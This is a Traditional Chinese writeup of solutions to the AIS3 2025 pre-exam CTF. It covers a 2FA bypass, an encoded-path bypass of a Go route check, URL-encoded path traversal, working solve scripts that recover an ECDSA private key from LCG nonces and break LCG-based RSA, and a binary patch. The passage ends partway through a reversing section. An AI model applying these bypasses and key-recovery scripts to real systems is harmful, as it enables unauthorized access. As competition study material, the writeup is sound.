---
title: AIS3 2025 pre-exam writeup
published: 2025-07-02
description: "Writeup for AIS3 2025 pre-exam writeup"
tags: ["Cybersec","writeup"]
category: CTF
draft: false
lang: zh_TW
---
# Web
## Login Screen 1
> 這題原本是黑箱 之後才公開source
但我在這之前就解掉了,所以這邊我就不提供source


進去會看到登入畫面
![CleanShot 2025-05-28 at 15.27.12@2x](https://hackmd.io/_uploads/B1Gmi4NMeg.png)

登入`guest`/`guest`: 
![CleanShot 2025-05-28 at 15.35.57@2x](https://hackmd.io/_uploads/HkokaVVfxe.png)

輸入完2FA code, 會被導到dashboard
![CleanShot 2025-05-28 at 15.36.59@2x](https://hackmd.io/_uploads/ByUBa4Vflx.png)

回到登入頁面, 本來想說隨便試試看, 輸入`admin`/`admin` 然後就不小心登入了

同樣是一個要輸入2FA的地方
![CleanShot 2025-05-28 at 15.32.38@2x](https://hackmd.io/_uploads/ryNQhE4Gel.png)

之前有刷過ching的2023 AIS3 pre-exam題目, 裡面有提跟這幾乎一模一樣

同樣先登入`admin`/`admin`, 但在2FA的地方直接帶著成功登入的token進去`dashboard.php`

雖然會直接被redirect回`2fa.php`, 但用burp可以攔截到
![CleanShot 2025-05-28 at 15.43.13@2x](https://hackmd.io/_uploads/SJH30NNzxe.png)

> Flag: AIS3{1.Es55y_SQL_1nJ3ct10n_w1th_2fa_IuABDADGeP0}

## Tomorin DB
![](https://truth.bahamut.com.tw/artwork/202412/50c9d30cd5623ae1a9154f58e7769b0e.GIF)
題目的結構長這樣:
![CleanShot 2025-05-28 at 15.46.17@2x](https://hackmd.io/_uploads/BJU5JHEMxl.png)


main.go:
```go=
package main

import "net/http"

func main() {
	http.Handle("/", http.FileServer(http.Dir("/app/Tomorin")))
	http.HandleFunc("/flag", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "https://youtu.be/lQuWN0biOBU?si=SijTXQCn9V3j4Rl6", http.StatusFound)
  	})
  	http.ListenAndServe(":30000", nil)
}
```
本來想說用`/./flag`但發現沒辦法，丟給GPT問還有甚麼方法

結果他用`/%2e/flag`可以過。仔細研究發現是因為`/%2e/flag`在ServeMux不會被轉為`/flag`

之後再進入cleanPath，他就會把`.`, `//`之類的方法清掉了，但他只用"字串層面"找，所以`%2e`可以繞過

反正就挺酷的

> Flag: AIS3{G01ang_H2v3_a_c0O1_way!!!_Us3ing_C0NN3ct_M3Th07_L0l@T0m0r1n_1s_cute_D0_yo7_L0ve_t0MoRIN?}

# Misc
## Ramen CTF
題目附了一個照片, 要找出在哪裡吃的以及點了什麼
![chal](https://hackmd.io/_uploads/SyqvvRDzlx.jpg)

使用google lens掃描發票的QRcode, 可以得到:
```
MF1687991111404137095000001f4000001f40000000034785923VG9sG89nFznfPnKYFRlsoA==:**:2:2:1:蝦拉
```
對店名最相關的應該就是發票上的`賣方`, 在對應到QRcode, 推測賣方統編應該是`34785923`

在拿這串統邊去財政部營業人統一編號查詢系統找, 得到店名為
![CleanShot 2025-05-31 at 09.20.20@2x](https://hackmd.io/_uploads/B1TDtRwfeg.png)

拿店名去搜尋, 發現什麼都沒有, 我就嘗試去google map拿登記地址去找

![image](https://hackmd.io/_uploads/SJ5NiqYzex.png)

發現附近好像只有"樂山溫泉拉麵"

拿者個店名去查, 果然出現不少東西

上面QRcode有掃出一個"蝦拉", 推測菜名應該跟這有關

然後我就找到:

![](https://suni.tw/wp-content/uploads/20200920000445_54.jpg)


> Flag: AIS3{樂山溫泉拉麵:蝦拉麵}

## AIS3 Tiny Server - Web / Misc
這是一道題組, 付了一個檔案和網址(檔案是給`AIS3 Tiny Server - rev`用的)

![CleanShot 2025-05-31 at 09.42.17@2x](https://hackmd.io/_uploads/rJL9R0Pfgg.png)

完全不知道在幹嘛, 因為聽別人說不建議逆他給的檔案, 所以我就純黑箱看

因為不知道要幹嘛, 就隨便亂碰碰看path traversel, 發現可以用URL encode到根目錄
![CleanShot 2025-05-31 at 09.45.19@2x](https://hackmd.io/_uploads/SkUrky_zeg.png)

再看到flag

![CleanShot 2025-05-31 at 09.45.54@2x](https://hackmd.io/_uploads/HJ-w11_zle.png)

> Flag: AIS3{tInY_we8_s3RveR_WitH_FIl3_8rOWs1ng_a5_@_Fe4TuR3}

## Welcome
> Flag: AIS3{Welcome_And_Enjoy_The_CTF_!}



# Crypto

## Stream
**chal:**
```python=
from random import getrandbits
import os
from hashlib import sha512
from flag import flag

def hexor(a: bytes, b: int):
    return hex(int.from_bytes(a)^b**2)

for i in range(80):
    print(hexor(sha512(os.urandom(True)).digest(), getrandbits(256)))

print(hexor(flag, getrandbits(256)))
```
加密方法:$\text{ciphertext} = \text{Flag} \oplus R^{2}$

$R^{2}$跟flag比大很多bit,而XOR只會運算道比較小的位元

所以$\text{ciphertext}$跟$R^{2}$會差不多,爆破他們之間的距離即可

```python=
import math
ciphertext = "0x1a95888d32cd61925d40815f139aeb35d39d8e33f7e477bd020b88d3ca4adee68de5a0dee2922628da3f834c9ada0fa283e693f1deb61e888423fd64d5c3694"

C_flag = int(ciphertext, 16)

approx_R = int(math.isqrt(C_flag))

delta_range = 500000
found_flag = None

for delta in range(-delta_range, delta_range + 1):
    potential_R = approx_R + delta
    
    if potential_R < 0:
        continue
    
    potential_R_squared = potential_R ** 2
    potential_flag_int = C_flag ^ potential_R_squared
    
    try:
        padded_flag_bytes = potential_flag_int.to_bytes(64, 'big')
        
        if b'AIS3{' in padded_flag_bytes:
            start_index = padded_flag_bytes.find(b'AIS3{')
            
            is_printable = True
            for char_val in padded_flag_bytes[start_index:]:
                if not (32 <= char_val <= 126 or char_val == 0):
                    is_printable = False
                    break
            
            if is_printable:
                decoded_flag = padded_flag_bytes.decode('utf-8', errors='ignore')
                print(decoded_flag)
            
    except OverflowError:
        pass
    except UnicodeDecodeError:
        pass
```

> Flag: AIS3{no_more_junks...plz}


## Hill
chal:
```python=
import numpy as np

p = 251
n = 8


def gen_matrix(n, p):
    while True:
        M = np.random.randint(0, p, size=(n, n))
        if np.linalg.matrix_rank(M % p) == n:
            return M % p

A = gen_matrix(n, p)
B = gen_matrix(n, p)

def str_to_blocks(s):
    data = list(s.encode())
    length = ((len(data) - 1) // n) + 1
    data += [0] * (n * length - len(data))  # padding
    blocks = np.array(data, dtype=int).reshape(length, n)
    return blocks

def encrypt_blocks(blocks):
    C = []
    for i in range(len(blocks)):
        if i == 0:
            c = (A @ blocks[i]) % p
        else:
            c = (A @ blocks[i] + B @ blocks[i-1]) % p
        C.append(c)
    return C

flag = "AIS3{Fake_FLAG}"
blocks = str_to_blocks(flag)
ciphertext = encrypt_blocks(blocks)

print("Encrypted flag:")
for c in ciphertext:
    print(c)

t = input("input: ")
blocks = str_to_blocks(t)
ciphertext = encrypt_blocks(blocks)
for c in ciphertext:
    print(c)
```
第0個區塊:
$$
C_{0}=(A\times P_{0})\text{mod}\; p
$$
第i(非0)個區塊:
$$
C_{} = (A \times P_{i}+B \times P_{i-1})\text{mod}\; p
$$
拿到A,B就可以得到flag

可以傳入basis vector，這樣就可以直接噴出來了:

$$
    A \;=\; 
    \begin{bmatrix}
      a_{0,0} & a_{0,1} & \cdots & a_{0,7} \\
      a_{1,0} & a_{1,1} & \cdots & a_{1,7} \\
      \vdots  & \vdots  & \ddots & \vdots  \\
      a_{7,0} & a_{7,1} & \cdots & a_{7,7}
    \end{bmatrix},
    \quad
    e_3 = 
    \begin{bmatrix}0\\0\\0\\1\\0\\0\\0\\0\end{bmatrix}
    \;\Longrightarrow\;
    A\,e_3 = 
    \begin{bmatrix}
      a_{0,3} \\ a_{1,3} \\ a_{2,3} \\ a_{3,3} \\ a_{4,3} \\ a_{5,3} \\ a_{6,3} \\ a_{7,3}
    \end{bmatrix}
  $$
 剩下反向操作即可，感謝我大GPT
 
```python=
import numpy as np
import sympy
from pwn import remote

p = 251
n = 8

def parse_line(line):
    s = line.decode().strip()
    if s.startswith('[') and s.endswith(']'):
        s = s[1:-1]
    return [int(x) for x in s.split()]

def mat_mul(M, v):
    return [(sum(M[i][j] * v[j] for j in range(n)) % p) for i in range(n)]

def vec_sub(v1, v2):
    return [(v1[i] - v2[i]) % p for i in range(len(v1))]

def solve():
    conn = remote("chals1.ais3.org", 18000)
    
    # Extract flag ciphertext
    initial = conn.recvuntil(b"input: ")
    lines = initial.split(b'\n')
    
    flag_blocks = []
    start = next(i for i, line in enumerate(lines) if b"Encrypted flag:" in line) + 1
    for line in lines[start:]:
        s = line.decode().strip()
        if not s or "input:" in s:
            break
        if s.startswith('[') or s[0].isdigit():
            flag_blocks.append(parse_line(line))
    
    # Send basis vectors payload
    payload = []
    for i in range(n):
        basis = [0] * n
        basis[i] = 1
        payload.extend(basis + [0] * n)
    
    conn.sendline(bytes(payload))
    response = conn.recvall(timeout=5)
    
    # Parse response blocks
    response_blocks = [parse_line(line) for line in response.strip().split(b'\n') if line.strip()]
    
    # Reconstruct matrices A and B
    A_cols = [response_blocks[2*i] for i in range(n)]
    B_cols = [response_blocks[2*i+1] for i in range(n)]
    
    A = [list(col) for col in zip(*A_cols)]
    B = [list(col) for col in zip(*B_cols)]
    
    # Compute A^-1
    A_inv = sympy.Matrix(A).inv_mod(p).tolist()
    
    # Decrypt flag blocks
    decrypted = []
    decrypted.append(mat_mul(A_inv, flag_blocks[0]))
    
    for i in range(1, len(flag_blocks)):
        BP = mat_mul(B, decrypted[i-1])
        term = vec_sub(flag_blocks[i], BP)
        decrypted.append(mat_mul(A_inv, term))
    
    # Convert to flag
    flag_bytes = [b for block in decrypted for b in block]
    while flag_bytes and flag_bytes[-1] == 0:
        flag_bytes.pop()
    
    flag = bytes(flag_bytes).decode('utf-8', errors='replace')
    print(flag)
    
    conn.close()

if __name__ == '__main__':
    solve()
```

## SlowECDSA
chal:
```python=
#!/usr/bin/env python3

import hashlib, os
from ecdsa import SigningKey, VerifyingKey, NIST192p
from ecdsa.util import number_to_string, string_to_number
from Crypto.Util.number import getRandomRange
from flag import flag

FLAG = flag

class LCG:
    def __init__(self, seed, a, c, m):
        self.state = seed
        self.a = a
        self.c = c
        self.m = m

    def next(self):
        self.state = (self.a * self.state + self.c) % self.m
        return self.state

curve = NIST192p
sk = SigningKey.generate(curve=curve)
vk = sk.verifying_key
order = sk.curve.generator.order()

lcg = LCG(seed=int.from_bytes(os.urandom(24), 'big'), a=1103515245, c=12345, m=order)

def sign(msg: bytes):
    h = int.from_bytes(hashlib.sha1(msg).digest(), 'big') % order
    k = lcg.next()
    R = k * curve.generator
    r = R.x() % order
    s = (pow(k, -1, order) * (h + r * sk.privkey.secret_multiplier)) % order
    return r, s

def verify(msg: str, r: int, s: int):
    h = int.from_bytes(hashlib.sha1(msg.encode()).digest(), 'big') % order
    try:
        sig = number_to_string(r, order) + number_to_string(s, order)
        return vk.verify_digest(sig, hashlib.sha1(msg.encode()).digest())
    except:
        return False

example_msg = b"example_msg"
print("==============SlowECDSA===============")
print("Available options: get_example, verify")

while True:
    opt = input("Enter option: ").strip()

    if opt == "get_example":
        print(f"msg: {example_msg.decode()}")
        example_r, example_s = sign(example_msg)
        print(f"r: {hex(example_r)}")
        print(f"s: {hex(example_s)}")

    elif opt == "verify":
        msg = input("Enter message: ").strip()
        r = int(input("Enter r (hex): ").strip(), 16)
        s = int(input("Enter s (hex): ").strip(), 16)

        if verify(msg, r, s):
            if msg == "give_me_flag":
                print("✅ Correct signature! Here's your flag:")
                print(FLAG.decode())
            else:
                print("✔️ Signature valid, but not the target message.")
        else:
            print("❌ Invalid signature.")

    else:
        print("Unknown option. Try again.")

```


- 曲線：`NIST192p`，基數 `n = order`
- 私鑰：`d = sk.privkey.secret_multiplier`
- 隨機數 k：不是隨機呼叫 `os.urandom()`，而是經LCG依序產生

$$
k_{i+1} \equiv (A k_i + C) \pmod{n},\quad
A = 1103515245,\; C = 12345
$$

- 簽章公式

$$
\begin{aligned}
r_i &= (k_i G)_x \bmod n\\
s_i &= k_i^{-1}\,\bigl(h_i + r_i d\bigr) \bmod n\\
\end{aligned}
$$

(其中$h_i = \operatorname{SHA1}(m_i)\bmod n$)


---
  
LCG為線性遞迴，只要抓到一組 $(k_1,k_2)$ 便能推出參數或直接預測下一值

伺服器允許同一訊息多次簽章，產生連續的 $k_1, k_2$

hash相同(訊息一樣），化簡推導相當容易



設兩次簽章皆用訊息 `example_msg`，得到

$$
\bigl(r_1,s_1,k_1\bigr),\quad
\bigl(r_2,s_2,k_2\bigr),\;
k_2 = Ak_1 + C \pmod n
$$

且 $h = \operatorname{SHA1}(\text{example_msg}) \bmod n$


$$
\begin{aligned}
s_1 k_1 &= h + r_1 d \pmod n\\
s_2 k_2 &= h + r_2 d \pmod n\\
\end{aligned}
$$

整理：

$$
d = \frac{s_1 k_1 - s_2 k_2}{r_1 - r_2} \pmod n
$$


代回第一條式子 $s_1 k_1 = h + r_1 d$：

$$
s_1 k_1 =
h + r_1\,
\frac{s_1 k_1 - s_2 (A k_1 + C)}{r_1 - r_2}
\pmod n
$$

得一次方程

$$
k_1\,(s_1 r_2 - A s_2 r_1)
=h(r_2 - r_1) + C\,s_2 r_1
\pmod n
$$


$$
k_1 =
\frac{h(r_2 - r_1) + C s_2 r_1}
      {s_1 r_2 - A s_2 r_1}
      \pmod n
$$

程式裡以 `pow(den, -1, n)` 取逆元即完成


有了 $k_1$，直接用標準式

$$
d = (s_1 k_1 - h) \, r_1^{-1} \pmod n
$$


$$
k_{\text{flag}} = A k_2 + C \pmod n
$$

計算

$$
\begin{aligned}
r_{\text{flag}} &= (k_{\text{flag}} G)_x \bmod n \\
s_{\text{flag}} &= k_{\text{flag}}^{-1}\,
                  \bigl(h_{\text{flag}} + r_{\text{flag}} d\bigr)
                  \bmod n
\end{aligned}
$$


exploit:

```python=
from pwn import remote
import hashlib
from ecdsa import NIST192p

A_LCG = 1103515245
C_LCG = 12345
curve = NIST192p
ORDER = curve.order
G = curve.generator

def get_example_sig(p):
    p.sendlineafter(b"Enter option: ", b"get_example")
    p.recvuntil(b"msg: ")
    msg_str = p.recvline().strip().decode()
    p.recvuntil(b"r: ")
    r_hex = p.recvline().strip().decode()
    p.recvuntil(b"s: ")
    s_hex = p.recvline().strip().decode()
    return msg_str.encode(), int(r_hex, 16), int(s_hex, 16)

def verify_sig(p, msg_str, r_val, s_val):
    p.sendlineafter(b"Enter option: ", b"verify")
    p.sendlineafter(b"Enter message: ", msg_str.encode())
    p.sendlineafter(b"Enter r (hex): ", hex(r_val).encode())
    p.sendlineafter(b"Enter s (hex): ", hex(s_val).encode())
    return p.recvall(timeout=2)

def main():
    p = remote('chals1.ais3.org', 19000)
    
    msg_ex_bytes, r1, s1 = get_example_sig(p)
    _, r2, s2 = get_example_sig(p)
    
    h_ex = int.from_bytes(hashlib.sha1(msg_ex_bytes).digest(), 'big') % ORDER
    
    # Recover k1
    term1 = (h_ex * r2 - h_ex * r1 + C_LCG * s2 * r1) % ORDER
    term2 = (s1 * r2 - A_LCG * s2 * r1) % ORDER
    k1 = (term1 * pow(term2, -1, ORDER)) % ORDER
    
    # Recover private key d
    d = ((s1 * k1 - h_ex) % ORDER * pow(r1, -1, ORDER)) % ORDER
    
    # Predict next nonce
    k2 = (A_LCG * k1 + C_LCG) % ORDER
    k_flag = (A_LCG * k2 + C_LCG) % ORDER
    
    # Sign "give_me_flag"
    msg_flag = "give_me_flag"
    h_flag = int.from_bytes(hashlib.sha1(msg_flag.encode()).digest(), 'big') % ORDER
    
    R_flag_point = G * k_flag
    r_flag = R_flag_point.x() % ORDER
    s_flag = (pow(k_flag, -1, ORDER) * (h_flag + r_flag * d)) % ORDER
    
    response = verify_sig(p, msg_flag, r_flag, s_flag)
    print(response.decode())
    p.close()

if __name__ == "__main__":
    main()
```

> Flag: AIS3{Aff1n3_nounc3s_c@N_bE_broke_ezily...}
## Random RSA
**chal:**
```python=
# chall.py
from Crypto.Util.number import getPrime, bytes_to_long
from sympy import nextprime
from gmpy2 import is_prime

FLAG = b"AIS3{Fake_FLAG}"

a = getPrime(512)
b = getPrime(512)
m = getPrime(512)
a %= m
b %= m
seed = getPrime(300)

rng = lambda x: (a*x + b) % m


def genPrime(x):
    x = rng(x)
    k=0
    while not(is_prime(x)):
        x = rng(x)
    return x

p = genPrime(seed)
q = genPrime(p)

n = p * q
e = 65537
m_int = bytes_to_long(FLAG)
c = pow(m_int, e, n)

# hint
seed = getPrime(300)
h0 = rng(seed)
h1 = rng(h0)
h2 = rng(h1)

with open("output.txt", "w") as f:
    f.write(f"h0 = {h0}\n")
    f.write(f"h1 = {h1}\n")
    f.write(f"h2 = {h2}\n")
    f.write(f"M = {m}\n")
    f.write(f"n = {n}\n")
    f.write(f"e = {e}\n")
    f.write(f"c = {c}\n")
```
**output:**
```
h0 = 2907912348071002191916245879840138889735709943414364520299382570212475664973498303148546601830195365671249713744375530648664437471280487562574592742821690
h1 = 5219570204284812488215277869168835724665994479829252933074016962454040118179380992102083718110805995679305993644383407142033253210536471262305016949439530
h2 = 3292606373174558349287781108411342893927327001084431632082705949610494115057392108919491335943021485430670111202762563173412601653218383334610469707428133
M = 9231171733756340601102386102178805385032208002575584733589531876659696378543482750405667840001558314787877405189256038508646253285323713104862940427630413
n = 20599328129696557262047878791381948558434171582567106509135896622660091263897671968886564055848784308773908202882811211530677559955287850926392376242847620181251966209002883852930899738618123390979377039185898110068266682754465191146100237798667746852667232289994907159051427785452874737675171674258299307283
e = 65537
c = 13859390954352613778444691258524799427895807939215664222534371322785849647150841939259007179911957028718342213945366615973766496138577038137962897225994312647648726884239479937355956566905812379283663291111623700888920153030620598532015934309793660829874240157367798084893920288420608811714295381459127830201
```

根據LCG定義, $x_{k+1} = a \times x_{k} + b \;(\text{mod} \;m)$

chal裡面h0為LCG初始值,其餘類推

$$
h_{2}-h_{1}=a(h_1-h_0)\;(\text{mod} \;m)
$$

所以
$$a=(h_{2}-h_{1})(h_{1}-h_{0})^{-1}\;(\text{mod} \;m)$$

$$b=h_1-a\times h_0\;(\text{mod} \;m)$$


第一次 LCG 輸出為 $h_0 = a\,x_0 + b \pmod m$
$$
a\,x_0 \;\equiv\; h_0 - b \pmod m
\quad\Longrightarrow\quad
x_0 \;\equiv\; (\,h_0 - b\,)\times a^{-1} \pmod m
$$

只要 $\gcd(a,m)=1$, 就可計算 $a^{-1}$ 以還原 $x_0$

計算出的 $x_0$ 小於m才有效

---

LCG 的第 $j$ 步輸出為
$$
       x_j \equiv a^j\,x_0 \;+\; b\,\frac{\,a^j - 1\,}{\,a - 1\,}\pmod m
$$
RSA的$p$就是某次$x_j$

結合 $n=p\,q$ 可得到一元二次同餘

$$
A_j\,p^2 + 2\,B_j\,p - n \;\equiv\;0\pmod m,
\quad
A_j=a^j,\;B_j=b\,(A_j-1)\;(a-1)^{-1}
$$
判別式$\Delta_j\equiv B_j^2 + 4\,A_j\,n\pmod m$
     
若非模 $m$ 下平方剩餘，則該 $j$ 可直接跳過；僅需對 $\Delta_j$ 為平方剩餘的 $j$ 試算平方根與驗證整除

```python=
from sympy.ntheory import sqrt_mod
from Crypto.Util.number import long_to_bytes

h0 = 2907912348071002191916245879840138889735709943414364520299382570212475664973498303148546601830195365671249713744375530648664437471280487562574592742821690
h1 = 5219570204284812488215277869168835724665994479829252933074016962454040118179380992102083718110805995679305993644383407142033253210536471262305016949439530
h2 = 3292606373174558349287781108411342893927327001084431632082705949610494115057392108919491335943021485430670111202762563173412601653218383334610469707428133
M = 9231171733756340601102386102178805385032208002575584733589531876659696378543482750405667840001558314787877405189256038508646253285323713104862940427630413
n = 20599328129696557262047878791381948558434171582567106509135896622660091263897671968886564055848784308773908202882811211530677559955287850926392376242847620181251966209002883852930899738618123390979377039185898110068266682754465191146100237798667746852667232289994907159051427785452874737675171674258299307283
e = 65537
c = 13859390954352613778444691258524799427895807939215664222534371322785849647150841939259007179911957028718342213945366615973766496138577038137962897225994312647648726884239479937355956566905812379283663291111623700888920153030620598532015934309793660829874240157367798084893920288420608811714295381459127830201

# Step 1: Recover LCG parameters
diff1 = (h1 - h0) % M
diff2 = (h2 - h1) % M
a = (diff2 * pow(diff1, -1, M)) % M
b = (h1 - a * h0) % M

print(f"[*] Recovered a: {a}")
print(f"[*] Recovered b: {b}")

# Step 2 & 3: Iterate on j and solve the congruence
inv_a_minus_1 = pow(a - 1, -1, M)
Aj = 1  # This will be a^j mod M

for j in range(1, 1001):
    Aj = (Aj * a) % M
    Bj = (b * (Aj - 1) * inv_a_minus_1) % M

    # Discriminant Dj = Bj^2 + 4*Aj*n mod M
    Dj = (pow(Bj, 2, M) + 4 * Aj * n) % M

    # Check if Dj is a quadratic residue
    if pow(Dj, (M - 1) // 2, M) != 1:
        continue
    
    print(f"\n[*] Found potential j = {j}")
    
    # Calculate the modular square roots
    y_roots = sqrt_mod(Dj, M, all_roots=True)
    if not y_roots:
        continue
    
    inv_2Aj = pow(2 * Aj, -1, M)
    
    # Step 4: Test candidates for p and decrypt
    for y in y_roots:
        p_cand = ((y - Bj) * inv_2Aj) % M
        
        if n % p_cand == 0:
            p = p_cand
            q = n // p
            
            # Sanity check if p and q are non-trivial factors
            if p != 1 and q != 1:
                print(f"[+] Successfully factored n!")
                print(f"[+] p = {p}")
                print(f"[+] q = {q}")

                phi = (p - 1) * (q - 1)
                d = pow(e, -1, phi)
                m_int = pow(c, d, n)
                flag = long_to_bytes(m_int)

                print(flag.decode())
                exit(0)
```

> Flag: AIS3{1_d0n7_r34lly_why_1_d1dn7_u53_637pr1m3}


# Rev

## Simple snake game
題目給一個貪食蛇遊戲

能死三次
![CleanShot 2025-05-27 at 08.57.35@2x](https://hackmd.io/_uploads/rk470Kfzel.png)

丟IDA, 追到`main` -> `WinMain` -> `main_getcmdline` -> `SDL_main`
```cpp=
int SDL_main()
{
  //省略變數宣告
  if ( (unsigned __int8)SnakeGame::Screen::init(v6) != 1 )
  {
    v8 = (SnakeGame::Snake *)"Error initializing screen";
    SDL_Log();
    lpuexcpt = -1;
  }
  else
  {
    v35 = 0;
    v22 = 1;
    v21 = 0;
    while ( !v35 && v26 > 0 )
    {
      SnakeGame::Screen::clear(v7);
      SnakeGame::Snake::draw((SnakeGame::Snake *)v29, v15);
      SnakeGame::Food::draw((SnakeGame::Food *)v29, v16);
      drawWalls(v23, v29);
      SnakeGame::Screen::update(v36, v26, 0, v17);
      if ( v22 )
      {
        v35 = holdGame((SnakeGame::Screen *)v29, 1500);
        v22 = 0;
      }
      switch ( SnakeGame::Screen::processEvents(v9) )
      {
        case 0:
          v35 = 1;
          break;
        case 1:
          if ( v27 != 1 )
            SnakeGame::Snake::updateDirection(0, (int)v15);
          break;
        case 2:
          if ( v27 != 1 )
            SnakeGame::Snake::updateDirection((SnakeGame::Snake *)1, (int)v15);
          break;
        case 3:
          if ( v27 != 1 )
            SnakeGame::Snake::updateDirection((SnakeGame::Snake *)2, (int)v15);
          break;
        case 4:
          if ( v27 != 1 )
            SnakeGame::Snake::updateDirection((SnakeGame::Snake *)3, (int)v15);
          break;
        case 5:
          v21 = 1;
          break;
        default:
          break;
      }
      if ( v21 )
        v35 = pauseGame((SnakeGame::Screen *)v29, &v21);
      Ticks = SDL_GetTicks();
      if ( !(Ticks / 10 % 6) )
      {
        if ( (unsigned __int8)SnakeGame::Snake::move(v7) != 1 )
        {
          resetLevel((SnakeGame::Snake *)v25, (SnakeGame::Food *)v24, &v22);
        }
        else
        {
          if ( (unsigned __int8)SnakeGame::Snake::collidesWith((SnakeGame::Snake *)v24, v15) )
          {
            SnakeGame::Food::Food(v10);
            SnakeGame::Food::operator=(v30);
            v36 = (SnakeGame::Screen *)((char *)v36 + SnakeGame::Food::S_VALUE);
            SnakeGame::Snake::addSection(v11);
          }
          v32 = v23;
          v20 = std::vector<SnakeGame::Wall *>::begin(v23);
          v19 = std::vector<SnakeGame::Wall *>::end(v32);
          while ( (unsigned __int8)__gnu_cxx::operator!=<SnakeGame::Wall **,std::vector<SnakeGame::Wall *>>(&v20, &v19) )
          {
            v31 = *(SnakeGame::Snake **)__gnu_cxx::__normal_iterator<SnakeGame::Wall **,std::vector<SnakeGame::Wall *>>::operator*(&v20);
            if ( (unsigned __int8)SnakeGame::Snake::collidesWith(v31, v15) )
              resetLevel((SnakeGame::Snake *)v25, (SnakeGame::Food *)v24, &v22);
            __gnu_cxx::__normal_iterator<SnakeGame::Wall **,std::vector<SnakeGame::Wall *>>::operator++(&v20);
          }
          for ( i = 1; ; ++i )
          {
            v1 = std::vector<SnakeGame::Section *>::size(&v28);
            if ( v1 <= i )
              break;
            v12 = *(SnakeGame::Snake **)std::vector<SnakeGame::Section *>::operator[](i);
            if ( (unsigned __int8)SnakeGame::Snake::collidesWith(v12, v15) )
              resetLevel((SnakeGame::Snake *)v25, (SnakeGame::Food *)v24, &v22);
          }
        }
      }
      if ( !v26 )
      {
        SnakeGame::Screen::clear(v7);
        SnakeGame::Screen::drawGameOver(v13);
        SnakeGame::Screen::update(v36, v26, 1, v17);
        holdGame((SnakeGame::Screen *)v29, 3000);
      }
    }
    freeWalls(v23);
    SnakeGame::Screen::close(v14);
    lpuexcpt = 0;
  }
  std::vector<SnakeGame::Wall *>::~vector(v23);
  SnakeGame::Snake::~Snake(v8);
  return lpuexcpt;
}
```
其中有一行:
```cpp
v36 = (SnakeGame::Screen *)((char *)v36 + SnakeGame::Food::S_VALUE);
```
`SnakeGame::Food::S_VALUE`是50, 可以猜到`v36`應該是分數之類的

繼續猜應該會有一行`v36 > ???`處理"Win"的邏輯,但沒看到

只能往下追
```cpp=
if ( !v26 )
{
    SnakeGame::Screen::clear(v7);
    SnakeGame::Screen::drawGameOver(v13);
    SnakeGame::Screen::update(v36, v26, 1, v17);
    holdGame((SnakeGame::Screen *)v29, 3000);
}
```
著重看到`update()`, 裡面還調用到`v36`
```cpp=
int __userpurge SnakeGame::Screen::update@<eax>(_DWORD *a1@<ecx>, SnakeGame::Screen *this, int a3, char a4, bool a5)
{
  SDL_UpdateTexture(a1[2], 0, a1[6], 3200);
  SDL_RenderClear(a1[1]);
  SDL_RenderCopy(a1[1], a1[2]);
  if ( a4 != 1 )
    SnakeGame::Screen::drawText(this, a3, 0);
  return SDL_RenderPresent(a1[1]);
}
```
在繼續追到`drawText()`
```cpp=
void __userpurge SnakeGame::Screen::drawText(_DWORD *a1@<ecx>, SnakeGame::Screen *this, int a3, int a4)
{

  if ( (int)this <= 11451419 || a3 <= 19810 )
  {
    SnakeGame::Screen::createText[abi:cxx11](a1, this, a3);
    v27 = 0xFFFFFF;
    v8 = std::string::c_str(v28);
    a1[3] = TTF_RenderText_Solid(a1[5], v8, 0xFFFFFF);
    a1[4] = SDL_CreateTextureFromSurface(a1[1], a1[3]);
    v23 = 400;
    v24 = 565;
    v25 = 320;
    v26 = 30;
    SDL_RenderCopy(a1[1], a1[4]);
    std::string::~string(v28);
  }
  else
  {
    v14[0] = -831958911;
    v14[1] = -1047254091;
    v14[2] = -1014295699;
    v14[3] = -620220219;
    v14[4] = 2001515017;
    v14[5] = -317711271;
    v14[6] = 1223368792;
    v14[7] = 1697251023;
    v14[8] = 496855031;
    v14[9] = -569364828;
    v15 = 26365;
    v16 = 40;
    std::allocator<char>::allocator(&v29);
    std::string::basic_string(v14, 43, &v29);
    std::allocator<char>::~allocator(&v29);
    for ( i = 0; ; ++i )
    {
      v4 = std::string::length(v22);
      if ( i >= v4 )
        break;
      lpuexcpt = *(_BYTE *)std::string::operator[](i);
      v9 = SnakeGame::hex_array1[i];
      *(_BYTE *)std::string::operator[](i) = v9 ^ lpuexcpt;
    }
    v21 = 0xFFFFFF;
    v5 = std::string::c_str(v22);
    v31 = TTF_RenderText_Solid(a1[5], v5, v21);
    if ( v31 )
    {
      TextureFromSurface = SDL_CreateTextureFromSurface(a1[1], v31);
      if ( TextureFromSurface )
      {
        v17 = 200;
        v18 = 565;
        v19 = 590;
        v20 = 30;
        SDL_RenderCopy(a1[1], TextureFromSurface);
        SDL_FreeSurface(v31);
        SDL_DestroyTexture(TextureFromSurface);
      }
      else
      {
        lpuexcptb = (struct _Unwind_Exception *)std::operator<<<std::char_traits<char>>(
                                                  (std::ostream::sentry *)&std::cerr,
                                                  "SDL_CreateTextureFromSurface: ");
        Error = (char *)SDL_GetError();
        std::operator<<<std::char_traits<char>>((std::ostream::sentry *)lpuexcptb, Error);
        std::ostream::operator<<(std::endl<char,std::char_traits<char>>);
        SDL_FreeSurface(v31);
      }
    }
    else
    {
      lpuexcpta = (struct _Unwind_Exception *)std::operator<<<std::char_traits<char>>(
                                                (std::ostream::sentry *)&std::cerr,
                                                "TTF_RenderText_Solid: ");
      v6 = (char *)SDL_GetError();
      std::operator<<<std::char_traits<char>>((std::ostream::sentry *)lpuexcpta, v6);
      std::ostream::operator<<(std::endl<char,std::char_traits<char>>);
    }
    std::string::~string(v22);
  }
}
```
找到關鍵點`if ( (int)this <= 11451419 || a3 <= 19810 )`

再把這行patch掉，`jle`改`jg`
![image](https://hackmd.io/_uploads/ryho3eDGgg.png)

這樣一打開遊戲，flag就噴出來了
![image](https://hackmd.io/_uploads/Hy8CngDGee.png)

> Flag: AIS3{CH3aT_Eng1n3?_0fcau53_I_bo_1T_by_hAnD}

## AIS3 Tiny Server - Reverse
題目給的檔案跟上面web的tiny server一樣

使用搜尋功能找`flag`可以看到`sub_2110`有出現過這個詞
![CleanShot 2025-05-31 at 15.21.36@2x](https://hackmd.io/_uploads/BkkGAmuzxg.png)

看起來上面的`sub_1E20`在做flag檢查, 追進去看:
```c=
_BOOL4 __cdecl sub_1E20(int a1)
{
  v1 = 0;
  v2 = 51;
  v9 = 20;
  v3 = 114;
  v8[0] = 1480073267;
  v8[1] = 1197221906;
  v8[2] = 254628393;
  v8[3] = 920154;
  v8[4] = 1343445007;
